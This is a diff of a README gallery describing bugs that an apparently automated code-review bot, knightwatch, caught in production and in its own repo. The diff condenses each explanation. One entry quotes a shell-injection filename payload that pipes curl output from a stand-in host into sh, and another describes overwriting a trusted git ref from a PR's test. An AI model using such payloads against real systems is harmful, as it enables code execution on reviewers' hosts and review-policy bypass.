@@ -1,8 +1,6 @@
 # Review Examples
 
-A small gallery of reviews where knightwatch caught something genuinely non-obvious — the kind of failure mode a careful human reader would have shipped.
-
-Each entry links to the original review comment, embeds a screenshot of what the bot posted, and explains why the catch matters. Ordered from most to least impressive. The first three are real production catches in [`cncorp/plow`](https://github.com/cncorp/plow) where the author (`@plonkus`) accepted and shipped the fix; the rest are catches the bot made on its own repo.
+Reviews where knightwatch stitched evidence across multiple files or systems to surface a bug that wasn't visible in any single one. Ordered from most to least impressive. The first three are production catches in [`cncorp/plow`](https://github.com/cncorp/plow) the author (`@plonkus`) accepted and shipped fixes for; the rest are catches the bot made reviewing its own code.
 
 ---
 
@@ -12,17 +10,7 @@ Each entry links to the original review comment, embeds a screenshot of what the
 
 ![plow#544 — connector_used middleware DetachedInstance](examples/plow544-connector-used.png)
 
-A new PostHog `connector_used` event passes the test suite but would silently fail in production. The bot traced the bug across five sources:
-
-- `main.py` — middleware runs *after* `call_next` returns, so the request-scoped SQLAlchemy session is already closed
-- `auth.py` — `lookup_session()` only preloads the `user` row, not `user.channels`
-- `analytics.py` — the `$set` payload then dereferences `user.channels`, triggering `DetachedInstanceError`
-- `connectors/gmail/calendar_router.py` — the live Calendar route never triggers preload elsewhere
-- `test_connector_used_middleware.py` — the existing test masks the bug because it injects a synthetic `request.state.auth_user` with channels prepopulated
-
-Plonkus fixed it via a `lookup_session` preload + a real-auth e2e test in `test_auth.py`; the next review confirmed *"the detached-session `connector_used` failure is fixed."*
-
-Why it tops the list: simulating ASGI middleware lifecycle + ORM session scope + payload dereference + route preload semantics + test fixture shape — five layers, none of them visible in any single file, and the test suite actively hides the bug.
+Traced a `DetachedInstanceError` across five seams: ASGI middleware runs after `call_next` returns (so the SQLAlchemy session is closed), `lookup_session` only preloads `user` and not `user.channels`, the `$set` payload dereferences the unloaded relationship, the Calendar route never triggers the preload elsewhere, and the existing middleware test hides the bug by injecting a synthetic `auth_user` with channels prepopulated. Plonkus shipped the preload plus a real-auth e2e test in `test_auth.py`.
 
 ---
 
@@ -32,11 +20,7 @@ Why it tops the list: simulating ASGI middleware lifecycle + ORM session scope +
 
 ![plow#487 — IAM Alembic startup outage](examples/plow487-iam-alembic.png)
 
-The PR wires `DB_IAM_AUTH=true` into `db/session.py`'s async engine — but the bot caught that the rollout would actually take prod down. The container's `start.sh` runs `alembic upgrade head` *before* Uvicorn, and `alembic/env.py` builds a plain `create_engine(get_url())` without the IAM hook (which only lives in `build_async_engine`). Combined with `terraform/locals.tf`/`ecs.tf` removing `DB_PASSWORD`, the migration step would crash trying passwordless auth as `plow_app` and the API would never boot.
-
-Plonkus fixed by reusing `get_sync_connection()` from Alembic. Follow-up review: *"Reusing `get_sync_connection(...)` from Alembic is the right seam: the migration path and runtime path now obtain credentials the same way."*
-
-Why impressive: the bug is invisible from any single file — the deploy mechanic (Terraform env + `start.sh` ordering) is what makes the otherwise-fine async-only hook a production-down change. Predicting a rollout-time outage from cross-stack evidence (shell + Terraform + Python entry points + the location of the IAM hook) is genuinely senior-level review.
+`start.sh` runs `alembic upgrade head` before Uvicorn, `alembic/env.py` builds a plain `create_engine(get_url())` without the IAM hook (only wired into `build_async_engine`), and Terraform had already removed `DB_PASSWORD` — so on rollout the migration would attempt passwordless auth as `plow_app` and the API would never boot. Plonkus made Alembic share `get_sync_connection()` with the runtime path so both seams obtain credentials the same way.
 
 ---
 
@@ -46,11 +30,7 @@ Why impressive: the bug is invisible from any single file — the deploy mechani
 
 ![plow#552 — VM-loss probe stale-port mismatch](examples/plow552-vm-probe.png)
 
-Phoenix's Swift VM-loss probe in `DaemonClient.swift` reads the system container's persisted `port` as evidence the VM is alive. But plowd's canonical reader in `plowd/container_registry.py` only treats the port as live when the container is `enabled` *AND* `running`. Because `startContainer()` writes `.starting` *before* the guest listens, and `stopContainer()` writes `.stopped` without clearing the port, `fetchStatus()` would see a stale port for 25 seconds and incorrectly restart the runtime as "VM instance lost."
-
-Plonkus fixed by routing the probe through `ContainerRegistry` instead of `ServiceURLs.gatewayPort()`: *"the VM-loss probe in `DaemonClient` no longer calls `ServiceURLs.gatewayPort()` — it now looks up the system container's allocated port via `ContainerRegistry`."*
-
-Why impressive: the bug only emerges from the *interaction* between two languages' state-machine interpretations of the same on-disk JSON, plus the precise timing of when status-write side effects happen relative to guest readiness. Cross-stack reasoning of this shape is rare even from senior reviewers.
+Phoenix's Swift VM-loss probe in `DaemonClient.swift` reads the persisted system-container `port` as proof the VM is alive, but plowd's canonical reader in `container_registry.py` only treats it as live when the container is `enabled` AND `running` — and `startContainer()` writes `.starting` before the guest listens while `stopContainer()` never clears the port, so the probe sees a stale port for 25 seconds and falsely restarts the runtime as "VM instance lost." Plonkus rerouted the probe through `ContainerRegistry` instead of `ServiceURLs.gatewayPort()`.
 
 ---
 
@@ -60,9 +40,7 @@ Why impressive: the bug only emerges from the *interaction* between two language
 
 ![PR #25 — shell injection via eval](examples/01-pr25-shell-injection.png)
 
-The new dead-code specialist runs detection commands assembled from filenames inside the PR's diff, then passes the assembled string through `eval` in `DEAD_CODE_CMDS`. The bot caught that a filename like `'; curl evil/x | sh; '` would execute on the reviewer's host with its `gh` credentials and local repo access.
-
-Why impressive: this is direct RCE on the reviewer's host with full GitHub auth. The catch is non-obvious because the *outer* command (`grep`, `find`) looks safe — the injection seam is in the substring being interpolated, which only matters once you trace the data path back to PR-controlled filenames.
+PR-controlled filenames from the diff flowed into `eval` inside `DEAD_CODE_CMDS`: a name like `'; curl evil/x | sh; '` would execute on the reviewer's host with its `gh` credentials and local repo access. The outer commands (`grep`/`find`) look safe — the injection seam is the substring they interpolate.
 
 ---
 
@@ -72,9 +50,7 @@ Why impressive: this is direct RCE on the reviewer's host with full GitHub auth.
 
 ![PR #29 — TOCTOU on origin/<default_branch>](examples/02-pr29-toctou.png)
 
-The reviewer reads policy files (`.knightwatch/siblings`, `.knightwatch/dead-code.sh`, `.knightwatch/strict-typing.sh`) from `origin/<default_branch>` to get the trusted, base-branch-owned review configuration. But the worker also runs the PR's own `just test` *before* those reads — and a PR's test could call `git update-ref refs/remotes/origin/main <attacker-sha>` to silently overwrite that ref locally.
-
-Multi-step trust-boundary bypass: timing window + git capability + assumed-immutable ref all have to land at once for a reviewer to see the bug. The PR effectively substitutes its own review policy while still appearing base-branch-owned.
+The worker runs the PR's own `just test` *before* reading `.knightwatch/*` policy from `origin/<default_branch>`, and a PR's test can call `git update-ref refs/remotes/origin/main <attacker-sha>` to silently overwrite that local ref. Trust-boundary bypass that requires the timing window, the git capability, and the assumption that `origin/main` is immutable to all line up.
 
 ---
 
@@ -84,9 +60,7 @@ Multi-step trust-boundary bypass: timing window + git capability + assumed-immut
 
 ![PR #18 — PrivateTmp defeating /tmp locks](examples/04-pr18-private-tmp-locks.png)
 
-The systemd unit uses `PrivateTmp=yes`, and detached workers were holding their per-PR locks under `/tmp/pr-review-locks/<pr>`. The bot caught that `PrivateTmp` gives every `systemctl start` a fresh per-execution `/tmp` namespace — so the lockfiles from tick N are invisible to tick N+1.
-
-Result: two workers can launch concurrently for the same PR and `rm -rf` each other's checkout mid-review. The catch hinges on knowing exactly how systemd's tmpfs namespacing interacts with detached processes — the kind of detail almost everyone reading this code would assume "lockfile in `/tmp` = cross-process exclusion" and move on.
+`PrivateTmp=yes` gives every `systemctl start` a fresh per-execution `/tmp` namespace, so the detached workers' lockfiles under `/tmp/pr-review-locks/<pr>` are invisible across timer ticks — two workers can launch concurrently for the same PR and `rm -rf` each other's checkout mid-review.
 
 ---
 
@@ -96,9 +70,7 @@ Result: two workers can launch concurrently for the same PR and `rm -rf` each ot
 
 ![PR #36 — clone --shared losing base ref](examples/05-pr36-clone-shared-base.png)
 
-For non-default-base PRs (release branches, feature bases) the worker does `git fetch origin <BASE_REF>` into the canonical clone, then `git clone --shared` into the per-PR workdir. The bot caught that `--shared` exposes canonical's *local* branches as `origin/*` but does not reliably copy `refs/remotes/origin/<BASE_REF>`.
-
-So in the per-PR workdir, `origin/<BASE_REF>` is silently absent, the diff snaps to whatever local default exists, and reviews use the wrong base — but only on PRs whose base is not the default branch. A failure class invisible to default-branch testing, plus an interaction with `clone --shared` semantics most people misremember.
+On non-default-base PRs the worker fetches `<BASE_REF>` into the canonical clone then `git clone --shared` into a per-PR workdir — but `--shared` only exposes canonical's *local* branches as `origin/*`, not `refs/remotes/origin/<BASE_REF>`, so the per-PR `origin/<BASE_REF>` is silently absent and the diff snaps to the wrong base. A failure class invisible to default-branch testing.
 
 ---
 
@@ -108,9 +80,7 @@ So in the per-PR workdir, `origin/<BASE_REF>` is silently absent, the diff snaps
 
 ![PR #25 — cross-repo search auth leak](examples/03-pr25-cross-repo-leak.png)
 
-A separate finding inside the same review body as #4: the dead-code specialist greps across canonical's local clones, which share an object database with sibling repos. Authorization is checked only against the *reviewed* repo, not against each sibling whose lines might be returned.
-
-A collaborator with access to repo A could cause private sibling-repo B's paths and lines to be quoted into A's review. Classic confused-deputy across what looks like one trust boundary but is actually two.
+Same review body as #4: the dead-code specialist greps across canonical's local clones, which share an object DB with sibling repos, but authorization is checked only against the *reviewed* repo. A collaborator on repo A could cause private sibling-repo B's paths and lines to surface in A's review — confused-deputy across what looked like one trust boundary.
 
 ---
 
@@ -120,9 +90,7 @@ A collaborator with access to repo A could cause private sibling-repo B's paths 
 
 ![PR #15 — aborted aggregator output staged as prior review](examples/06-pr15-aborted-aggregator.png)
 
-The orchestrator stages the aggregator's output as `prior-reviews.md` so the next round's bug-class-recurrence pass can compare against it. The bot caught that this staging happened even when the aggregator exited non-zero but left non-empty partial output.
-
-Result: a truncated, half-rendered aggregator dump becomes the canonical "previous review" — fabricating recurrence evidence from reviews the author never saw. The subtle failure mode is that partial data is *worse* than no data, because it actively misleads the next pass instead of forcing it to start fresh.
+The orchestrator was staging the aggregator's output as `prior-reviews.md` for the next round's bug-class-recurrence pass even when the aggregator exited non-zero with non-empty partial output — fabricating recurrence evidence from reviews the author never saw. Partial data here is worse than no data: it actively misleads the next pass instead of forcing it to start fresh.
 
 ---
 
@@ -132,9 +100,7 @@ Result: a truncated, half-rendered aggregator dump becomes the canonical "previo
 
 ![PR #14 — substring-triggered approval](examples/08-pr14-substring-approve.png)
 
-The approval poller checked comment bodies with `grep -qiF '/srosro-approve'` and treated any match as an approval command. The bot caught that a trusted collaborator writing "don't use `/srosro-approve` yet" or "we should add `/srosro-approve` later" would trigger a real `gh pr review --approve` side effect.
-
-A substring-vs-command-parse mismatch with real production blast radius — a single misquoted phrase in a normal-looking comment would auto-approve a PR.
+`is_approve_request` checked comment bodies with `grep -qiF '/srosro-approve'` as a substring match, so a trusted collaborator writing "don't use `/srosro-approve` yet" or "we should add `/srosro-approve` later" would trigger a real `gh pr review --approve` side effect. Substring-vs-command-parse mismatch with auto-approve blast radius.
 
 ---
 
@@ -144,6 +110,4 @@ A substring-vs-command-parse mismatch with real production blast radius — a si
 
 ![PR #28 — merge-from-main hunks miscredited](examples/07-pr28-merge-from-main.png)
 
-The review-scope diff (`git diff base..head`) includes hunks the PR author never touched if they merged main and the merge brought along upstream changes to the same files. Those hunks were getting attributed to the PR author in findings.
-
-A fairness regression: the bot would blame an author for code they only inherited via a merge. Real, but the easiest of the eleven to spot once you sit down and think carefully about diff-base semantics — which is why it lands at the bottom of this list.
+`git diff base..head` was including hunks the PR author never touched when they merged main and the merge re-shipped upstream lines — those hunks were being credited to the author in findings. A fairness regression that only surfaces after a merge-from-main on a long-running branch.
